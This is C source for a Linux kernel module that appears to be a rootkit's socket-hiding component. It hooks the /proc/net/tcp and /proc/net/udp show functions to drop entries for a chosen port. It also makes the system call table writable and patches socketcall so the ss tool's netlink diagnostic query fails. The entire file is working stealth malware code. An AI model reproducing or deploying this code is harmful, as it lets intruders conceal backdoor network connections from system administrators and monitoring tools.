#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <net/tcp.h>
#include <net/udp.h>
#include <net/inet_sock.h>
#include <linux/socket.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"
#include "hide_sockets.h"


// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
// for hooking the original read function
typedef int (*fun_int_seq_file_void) (struct seq_file*, void*);
fun_int_seq_file_void tcp_show_orig;
fun_int_seq_file_void udp_show_orig;

typedef asmlinkage long (*fun_long_int_unsigned_long)(int, unsigned long __user*);
fun_long_int_unsigned_long orig_socketcall;


int port_to_hide = -1;
char* prot_to_hide = "";

void hide_socket(char *protocol, int port){
    prot_to_hide = protocol;
    port_to_hide = port;
}

void hideTCP(int port){
    hide_socket("tcp", port);
}

void hideUDP(int port){
    hide_socket("udp", port);
}

void unhideSocket(void){
    hide_socket("", -1);
}

static int hooked_udp_show(struct seq_file* file, void* v){
    int port;
    struct sock* sk;
    struct inet_sock* s;
    if (strcmp(prot_to_hide, "udp")){
        return udp_show_orig(file, v);
    }
    if (v == SEQ_START_TOKEN) {
        return udp_show_orig(file, v);
    }
    sk = (struct sock*) v;
    s = inet_sk(sk);
    OUR_DEBUG("pointer : %p\n", s);
    port = ntohs(s->sport);
    OUR_DEBUG("udp_show port: %d\n", s->sport);
    if (port == port_to_hide){
        return 0;
    } 
    return udp_show_orig(file, v);
}

static int hooked_tcp_show(struct seq_file* file, void* v){
    int port;
    struct sock* sk;
    struct inet_sock* s;    
    if (strcmp(prot_to_hide, "tcp")){
        return tcp_show_orig(file, v);
    }
    if (v == SEQ_START_TOKEN) {
        return tcp_show_orig(file, v);
    }
    sk = (struct sock*) v;
    s = inet_sk(sk);
    OUR_DEBUG("pointer : %p\n", s);
    port = ntohs(s->sport);
    OUR_DEBUG("tcp_show port: %d, %d\n", port, port_to_hide);
    if (port == port_to_hide){
        return 0;
    } 
    return tcp_show_orig(file, v);
}

asmlinkage long hooked_socketcall(int call, unsigned long __user* args){
    // when a socket gets opened with exaclty the arguments which ss uses, return -1
    // returning -1 causes ss to try it via /proc/net, which we already hooked
    if(call == SYS_SOCKET && args[0] == AF_NETLINK && args[1] == SOCK_RAW && args[2] == NETLINK_INET_DIAG)
        return -1;
    return orig_socketcall(call, args);
}

void load_sockethiding(void){
    struct proc_dir_entry *p = init_net.proc_net->subdir;
    struct tcp_seq_afinfo *tcp_seq = 0;
    struct udp_seq_afinfo *udp_seq = 0;
    void** syscall_table = (void*)ptr_sys_call_table;
    int counter = 0;
    while (p && counter <2){
        if (strcmp(p->name, "tcp")==0){
            tcp_seq = p->data;
            tcp_show_orig = tcp_seq->seq_ops.show;
            tcp_seq->seq_ops.show = hooked_tcp_show;
            counter++;
        }
        if (strcmp(p->name, "udp")==0){
            udp_seq = p->data;
            udp_show_orig = udp_seq->seq_ops.show;
            udp_seq->seq_ops.show = hooked_udp_show;
            counter++;
        }
        p = p->next;
    }

    orig_socketcall = (fun_long_int_unsigned_long)syscall_table[__NR_socketcall];
    make_page_writable((long unsigned int)ptr_sys_call_table);
    syscall_table[__NR_socketcall] = hooked_socketcall;
}

void unload_sockethiding(void){
    struct proc_dir_entry *p = init_net.proc_net->subdir;
    struct tcp_seq_afinfo *tcp_seq = 0;
    struct udp_seq_afinfo *udp_seq = 0;
    void** syscall_table;
    int counter = 0;
    while (p && counter <2){
        if (strcmp(p->name, "tcp")==0){
            tcp_seq = p->data;
            tcp_seq->seq_ops.show = tcp_show_orig;
            counter++;
        }
        if (strcmp(p->name, "udp")==0){
            udp_seq = p->data;
            udp_seq->seq_ops.show = udp_show_orig;
            counter++;
        }
        p = p->next;
    }

    syscall_table = (void**) ptr_sys_call_table;
    syscall_table[__NR_socketcall] = orig_socketcall;
}
